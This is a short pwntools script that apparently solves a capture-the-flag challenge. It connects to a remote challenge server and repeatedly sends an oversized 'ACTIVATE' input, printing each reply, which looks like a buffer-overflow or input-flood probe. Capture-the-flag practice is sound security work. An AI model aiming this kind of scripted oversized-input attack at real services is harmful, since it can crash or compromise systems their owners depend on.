#!/usr/bin/env python3
from pwn import *


PROMPT = b'> '

conn = remote('challenge.apocalypse.lol', 9999)
data = conn.recvuntil(PROMPT).decode('utf-8')
print(data)

for i in range(5):
    conn.send(b'ACTIVATE' * 100)
    conn.send(b'\n')
    reply = conn.recvuntil(PROMPT).decode('utf-8')
    print(reply)

    conn.send(b'ACTIVATE\n')
    reply = conn.recv().decode('utf-8')
    print(reply)

reply = conn.recvall().decode('utf-8')
print(reply)
